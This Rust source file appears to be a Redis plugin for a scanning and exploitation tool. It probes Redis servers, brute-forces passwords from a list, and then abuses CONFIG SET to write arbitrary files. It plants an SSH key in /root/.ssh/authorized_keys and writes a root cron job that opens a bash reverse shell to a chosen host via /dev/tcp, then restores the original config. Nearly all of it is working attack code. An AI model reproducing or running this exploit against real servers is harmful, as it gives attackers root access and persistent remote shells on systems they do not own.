use anyhow::{Context, Result};
use serde_json::json;
use std::collections::BTreeMap;
use std::net::TcpStream;
use std::time::Duration;

use super::*;

pub(crate) fn scan_redis(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
    let runtime = current_redis_runtime_options();
    let response = send_tcp_command(target, b"INFO\r\n", context.timeout_secs)?;
    if response.contains("redis_version") {
        let _ = redis_run_exploit(target, None, context.timeout_secs, &runtime);
        return Ok(Some(PluginFinding {
            plugin: "redis".to_string(),
            target: target.clone(),
            status: "unauthorized".to_string(),
            details: BTreeMap::from([
                ("service".to_string(), json!("redis")),
                ("port".to_string(), json!(target.port)),
                ("type".to_string(), json!("unauthorized")),
            ]),
        }));
    }

    if !response.to_ascii_uppercase().contains("NOAUTH") {
        return Ok(None);
    }

    if brute_force_disabled() {
        return Ok(None);
    }

    for password in passwords_for_user(None, context) {
        let auth_command = format!("AUTH {password}\r\nINFO\r\n");
        let auth_response =
            send_tcp_command(target, auth_command.as_bytes(), context.timeout_secs)?;
        if auth_response.contains("+OK") && auth_response.contains("redis_version") {
            let _ = redis_run_exploit(
                target,
                Some(password.as_str()),
                context.timeout_secs,
                &runtime,
            );
            return Ok(Some(PluginFinding {
                plugin: "redis".to_string(),
                target: target.clone(),
                status: "weak-password".to_string(),
                details: BTreeMap::from([
                    ("service".to_string(), json!("redis")),
                    ("port".to_string(), json!(target.port)),
                    ("type".to_string(), json!("weak-password")),
                    ("password".to_string(), json!(password)),
                ]),
            }));
        }
    }

    Ok(None)
}

pub(crate) fn redis_run_exploit(
    target: &OpenService,
    password: Option<&str>,
    timeout_secs: u64,
    options: &RedisRuntimeOptions,
) -> Result<()> {
    if options.disable_redis || !redis_exploit_requested(options) {
        return Ok(());
    }

    let timeout = Duration::from_secs(timeout_secs.max(1));
    let mut stream = connect_stream(target, timeout)?;
    redis_auth_if_needed(&mut stream, password)?;
    let (dbfilename, dir) = redis_get_config(&mut stream)?;

    if let (Some(path), Some(content)) = (
        options.redis_write_path.as_deref(),
        options.redis_write_content.as_deref(),
    ) {
        let file = std::path::Path::new(path);
        let dir_path = file
            .parent()
            .map(|value| value.to_string_lossy().to_string())
            .unwrap_or_else(|| ".".to_string());
        let file_name = file
            .file_name()
            .map(|value| value.to_string_lossy().to_string())
            .unwrap_or_else(|| "dump.rdb".to_string());
        let _ = redis_write_custom_file(&mut stream, &dir_path, &file_name, content);
    }

    if let (Some(path), Some(source)) = (
        options.redis_write_path.as_deref(),
        options.redis_write_file.as_ref(),
    ) {
        if let Ok(content) = fs::read_to_string(source) {
            let file = std::path::Path::new(path);
            let dir_path = file
                .parent()
                .map(|value| value.to_string_lossy().to_string())
                .unwrap_or_else(|| ".".to_string());
            let file_name = file
                .file_name()
                .map(|value| value.to_string_lossy().to_string())
                .unwrap_or_else(|| "dump.rdb".to_string());
            let _ = redis_write_custom_file(&mut stream, &dir_path, &file_name, &content);
        }
    }

    if let Some(key_file) = options.redis_file.as_ref() {
        if let Ok(key) = redis_read_first_nonempty_line(key_file) {
            let _ = redis_write_public_key(&mut stream, &key);
        }
    }

    if let Some(shell) = options.redis_shell.as_deref() {
        let _ = redis_write_cron(&mut stream, shell);
    }

    let _ = redis_restore_config(&mut stream, &dbfilename, &dir);
    Ok(())
}

pub(crate) fn redis_exploit_requested(options: &RedisRuntimeOptions) -> bool {
    options.redis_file.is_some()
        || options.redis_shell.is_some()
        || (options.redis_write_path.is_some() && options.redis_write_content.is_some())
        || (options.redis_write_path.is_some() && options.redis_write_file.is_some())
}

pub(crate) fn redis_auth_if_needed(stream: &mut TcpStream, password: Option<&str>) -> Result<()> {
    if let Some(password) = password {
        let response = redis_send_command(stream, &format!("AUTH {password}\r\n"))?;
        if !response.contains("+OK") {
            anyhow::bail!("redis auth failed");
        }
    }
    Ok(())
}

pub(crate) fn redis_get_config(stream: &mut TcpStream) -> Result<(String, String)> {
    let dbfilename =
        redis_parse_config_value(&redis_send_command(stream, "CONFIG GET dbfilename\r\n")?)
            .context("missing redis dbfilename")?;
    let dir = redis_parse_config_value(&redis_send_command(stream, "CONFIG GET dir\r\n")?)
        .context("missing redis dir")?;
    Ok((dbfilename, dir))
}

pub(crate) fn redis_parse_config_value(response: &str) -> Option<String> {
    let parts = response
        .split("\r\n")
        .filter(|value| !value.is_empty())
        .collect::<Vec<_>>();
    parts.last().map(|value| (*value).to_string())
}

pub(crate) fn redis_write_custom_file(
    stream: &mut TcpStream,
    dir_path: &str,
    file_name: &str,
    content: &str,
) -> Result<bool> {
    let response = redis_send_command(stream, &format!("CONFIG SET dir {dir_path}\r\n"))?;
    if !response.contains("OK") {
        return Ok(false);
    }
    let response = redis_send_command(stream, &format!("CONFIG SET dbfilename {file_name}\r\n"))?;
    if !response.contains("OK") {
        return Ok(false);
    }
    let safe = content.replace('"', "\\\"").replace('\n', "\\n");
    let response = redis_send_command(stream, &format!("set x \"{safe}\"\r\n"))?;
    if !response.contains("OK") {
        return Ok(false);
    }
    let response = redis_send_command(stream, "save\r\n")?;
    Ok(response.contains("OK"))
}

pub(crate) fn redis_write_public_key(stream: &mut TcpStream, key: &str) -> Result<bool> {
    let response = redis_send_command(stream, "CONFIG SET dir /root/.ssh/\r\n")?;
    if !response.contains("OK") {
        return Ok(false);
    }
    let response = redis_send_command(stream, "CONFIG SET dbfilename authorized_keys\r\n")?;
    if !response.contains("OK") {
        return Ok(false);
    }
    let response = redis_send_command(stream, &format!("set x \"\\n\\n\\n{key}\\n\\n\\n\"\r\n"))?;
    if !response.contains("OK") {
        return Ok(false);
    }
    let response = redis_send_command(stream, "save\r\n")?;
    Ok(response.contains("OK"))
}

pub(crate) fn redis_write_cron(stream: &mut TcpStream, host: &str) -> Result<bool> {
    let mut response = redis_send_command(stream, "CONFIG SET dir /var/spool/cron/crontabs/\r\n")?;
    if !response.contains("OK") {
        response = redis_send_command(stream, "CONFIG SET dir /var/spool/cron/\r\n")?;
        if !response.contains("OK") {
            return Ok(false);
        }
    }
    let response = redis_send_command(stream, "CONFIG SET dbfilename root\r\n")?;
    if !response.contains("OK") {
        return Ok(false);
    }
    let mut segments = host.split(':');
    let host = segments.next().unwrap_or_default();
    let port = segments.next().unwrap_or_default();
    if host.is_empty() || port.is_empty() {
        return Ok(false);
    }
    let cron = format!("set xx \"\\n* * * * * bash -i >& /dev/tcp/{host}/{port} 0>&1\\n\"\r\n");
    let response = redis_send_command(stream, &cron)?;
    if !response.contains("OK") {
        return Ok(false);
    }
    let response = redis_send_command(stream, "save\r\n")?;
    Ok(response.contains("OK"))
}

pub(crate) fn redis_restore_config(stream: &mut TcpStream, dbfilename: &str, dir: &str) -> Result<()> {
    let _ = redis_send_command(stream, &format!("CONFIG SET dbfilename {dbfilename}\r\n"))?;
    let _ = redis_send_command(stream, &format!("CONFIG SET dir {dir}\r\n"))?;
    Ok(())
}

pub(crate) fn redis_read_first_nonempty_line(path: &std::path::Path) -> Result<String> {
    let content = fs::read_to_string(path)
        .with_context(|| format!("failed to read redis file {}", path.display()))?;
    content
        .lines()
        .map(str::trim)
        .find(|line| !line.is_empty())
        .map(ToString::to_string)
        .context("redis file is empty")
}

pub(crate) fn redis_send_command(stream: &mut TcpStream, command: &str) -> Result<String> {
    write_and_flush(stream, command.as_bytes())?;
    read_available(stream)
}
